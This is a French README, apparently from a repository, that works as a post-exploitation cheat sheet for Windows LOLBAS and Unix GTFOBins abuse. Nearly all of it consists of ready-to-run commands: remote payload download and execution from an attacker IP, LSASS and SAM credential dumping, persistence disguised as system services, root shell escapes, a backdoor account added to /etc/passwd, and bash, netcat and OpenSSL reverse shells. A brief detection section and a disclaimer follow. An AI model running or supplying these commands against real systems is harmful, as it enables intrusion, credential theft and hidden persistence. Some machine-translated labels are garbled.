<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 Vivre de la terre (LOLBAS & GTFOBins) - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<p align="center">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Évasion de défense">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Vivre de la terre">
</p>

<p align="center">
  <b>🛠️ Référence complète pour abuser des binaires système préinstallés légitimes pour exécuter du code, télécharger des charges utiles et élever des privilèges</b>
</p>

---

## 📋 Table des matières

- [Introduction](#-introduction)
- [Pourquoi vivre de la terre ?](#-pourquoi-vivre-de-la-terre)
- [Partie 1 : Windows LOLBAS](#-part-1-windows-lolbas)
  - [Téléchargement et entrée de fichiers](#file-download--ingress)
  - [Exécution de code et contournement d'AppLocker](#code-execution--applocker-bypass)
  - [Dumping d'informations d'identification (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Reconnaissance & Découverte](#reconnaissance--découverte)
  - [Persistance et tâches planifiées](#persistence--tâches planifiées)
- [Partie 2 : GTFOBins Unix / Linux](#-part-2-unix--linux-gtfobins)
  -[SUID et Sudo Shell Escapes](#suid--sudo-shell-escapes)
  - [Exploitation de lecture et d'écriture de fichiers](#file-read--write-exploitation)
  - [Entrée réseau et shells inversés](#network-ingress--reverse-shells)
  - [Interprètes GTFObins à fort impact](#gtfobins-high-impact-interpreters)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et détection](#-considérations-defensives--détection)
- [Mentions légales](#-legal-disclaimer)
- [Ressources](#-ressources)

---

## 🎯Présentation

**Living Off The Land (LotL)** est une technologie post-exploitation dans laquelle les attaquants et les équipes rouges utilisent exclusivement des binaires, des scripts et des bibliothèques système légitimes, intégrés et fiables, déjà présents sur le système d'exploitation.

- **LOLBAS (Windows) :** Vivre des binaires, scripts et bibliothèques terrestres.
- **GTFOBins (Unix/Linux) :** Collection organisée de binaires Unix qui peuvent être abusés pour contourner les restrictions de sécurité locales, échapper aux shells restreints et élever les privilèges.

---

## ⚖️Pourquoi vivre de la terre ?

1. 🛡️ **Contourne la liste blanche des applications :** Les binaires comme `certutil.exe`, `rundll32.exe` ou `find` sont signés numériquement par Microsoft ou les fournisseurs de systèmes d'exploitation et approuvés par AppLocker, WDAC et SELinux.
2. 👁️ **Évite l'AV/EDR basé sur les signatures :** Aucun exécutable malveillant étranger (`.exe`, `.elf`) n'est déposé sur le disque.
3. 📉 **Faible empreinte opérationnelle :** Réduit les anomalies médico-légales des journaux en utilisant des outils d'administration natifs.

---

## 🪟 Partie 1 : Windows LOLBAS

### Téléchargement et entrée de fichiers

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe et PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Exécution de code et contournement d'AppLocker

#### 1. Mshta.exe (exécuter HTA/VBScript à distance)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (technique Squablydoo)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (exécution de script XSL)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Dumping d'informations d'identification (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (vidage LSASS)
Vider la mémoire du processus LSASS sans supprimer Mimikatz :
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (Enregistrer les ruches SAM, SYSTEM et SECURITY)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Reconnaissance & Découverte
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Persistance et tâches planifiées
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Partie 2 : GTFOBins Unix / Linux

### Évasion SUID et Sudo Shell

Lorsqu'un binaire a un SUID défini (`chmod u+s`) ou est accordé dans `sudo -l`, abusez-en pour un shell racine immédiat :

#### 1. Sudo / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Sudo / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Sudo / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Sudo / SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Sudo / SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Sudo / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Exploitation de fichiers en lecture et en écriture

Lorsque vous ne pouvez pas générer directement un shell, utilisez les utilitaires de lecture/écriture de fichiers pour écraser `/etc/passwd` ou lire `/etc/shadow` :

#### Écraser `/etc/passwd` via Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Lire les fichiers sensibles via les binaires SUID
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Entrée réseau et shells inversés

Transférez des fichiers et des pop shells sans `curl` ou `wget` :

#### 1. Shell inversé TCP natif Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Netcat natif (sans indicateur `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. Shell inversé crypté OpenSSL
Sur l'attaquant :
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
Sur la cible :
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### GTFOBins Interprètes à fort impact

Si les interprètes bénéficient de Sudo / SUID :
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Tableau de référence rapide

| Système d'exploitation | Binaire | Objectif | Commande d'abus |
|----|--------|---------|---------------|
| **Gagner** | `certutil.exe` | Télécharger le fichier | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Gagner** | `mshta.exe` | Exécutif HTA à distance | `mshta http://<IP>/payload.hta` |
| **Gagner** | `regsvr32.exe` | Exécution de scriptlets | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Gagner** | `rundll32.exe` | Décharge LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | Coque SUID | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Coquille Sudo | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Évasion d'obus | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Écrasement de fichier | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Considérations défensives et détection

1. **Audit de la journalisation de la ligne de commande :**
   Activez **Sysmon (ID d'événement 1)** et la journalisation de la création des processus Windows (ID d'événement 4688) avec l'audit de ligne de commande pour surveiller les arguments anormaux transmis à `certutil`, `mshta` et `rundll32`.
2. **Bloquer les relations parent-enfant malveillantes :**
   Surveillez `mshta.exe` ou `regsvr32.exe` engendrant `cmd.exe` ou `powershell.exe`.
3. **Restreindre les directives Sudo :**
   Évitez les caractères génériques (`*`) dans `/etc/sudoers`. N'autorisez jamais les utilisateurs à exécuter des éditeurs de texte (`vim`, `nano`) ou des compilateurs en tant que root.

---

## ⚠️ Mentions légales

> **IMPORTANT :** Les techniques de Living Off The Land abusent des utilitaires administratifs fiables. Cette aide-mémoire est strictement destinée aux évaluations de sécurité autorisées, au renforcement défensif et aux études pédagogiques.

---

## 📚 Ressources

- [Dépôt officiel du projet LOLBAS](https://lolbas-project.github.io/)
- [Dépôt officiel GTFObins](https://gtfobins.github.io/)
- [MITRE ATT&CK : Subversion des contrôles de confiance (T1564)](https://attack.mitre.org/techniques/T1564/)